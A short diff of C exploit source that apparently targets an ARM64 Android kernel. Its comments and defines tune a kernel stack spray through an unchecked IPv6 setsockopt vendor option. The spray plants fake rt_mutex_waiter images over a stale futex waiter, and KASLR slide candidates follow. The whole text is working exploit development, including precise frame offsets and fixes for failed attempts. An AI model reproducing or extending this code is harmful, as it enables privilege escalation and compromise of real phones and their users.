@@ -76,21 +76,26 @@
  * instead: optname 43/44/46/47 on an AF_INET6 SOCK_DGRAM socket at level
  * IPPROTO_IPV6 (0x29) zeroes a 0x108-byte stack buffer at sp+0x40 and copies it
  * from user with no capability check (verified in the kernel disassembly at
- * do_ipv6_setsockopt+0x130).  The measured syscall chain (entry 0x1e0 +
+ * do_ipv6_setsockopt+0x130).  The naive chain model (entry 0x1e0 +
  * __arm64_sys_setsockopt 0x10 + __sys_setsockopt 0x70 + sock_common_setsockopt
  * 0x10 + udpv6_setsockopt 0x40 + do_ipv6_setsockopt 0x2c0 = 0x60 stp frame +
- * 0x260 sub frame) puts do_ipv6_setsockopt sp at T-0x570, so the buffer lands
- * at T-0x530 and covers the stale waiter at T-0x4b8 = buffer + 0x78.  The
- * handler then fails validation (buffer[0x8] != 0xa and buffer[0x88] != 0xa,
- * do_ipv6_setsockopt+0xce8) and returns -EADDRNOTAVAIL (-99); the planted
- * words persist on the popped stack.
+ * 0x260 sub frame) puts the buffer near T-0x530, but the live kernel adds
+ * tracepoint frames on this path (perf_tp_event in the popped-stack content
+ * of every setsockopt crash dump), so the single-offset guesses
+ * (0x40/0x18/0x78) all missed: the node kept its original futex data and
+ * the PI walk read waiter->lock == 0 at T-0x4b8.  The spray therefore
+ * plants the complete waiter word set repeatedly across the whole 0x108
+ * buffer (one image every 0x10) so any node position inside the buffer
+ * lands in a full rt_mutex_waiter image; the handler then fails validation
+ * (buffer[0x8] != 0xa and buffer[0x88] != 0xa, do_ipv6_setsockopt+0xce8)
+ * and returns -EADDRNOTAVAIL (-99); the planted words persist on the
+ * popped stack.
  */
 #define SLIDE_USE_SETSO_SPRAY 1
 #define SLIDE_SETSO_SPRAY_FAMILY AF_INET6
 #define SLIDE_SETSO_SPRAY_LEVEL 0x29       /* IPPROTO_IPV6 */
 #define SLIDE_SETSO_SPRAY_OPTNAME 43       /* MTK vendor optname, 0x108-byte copy */
 #define SLIDE_SETSO_SPRAY_COPY_LEN 0x108
-#define SLIDE_SETSO_SPRAY_WAITER_OFF 0x78  /* waiter tree_entry offset in the buffer */
 
 #define SLIDE_P0_OFFSET_CANDIDATES \
  0x000000ULL, 0x010000ULL, 0x020000ULL, 0x030000ULL, \
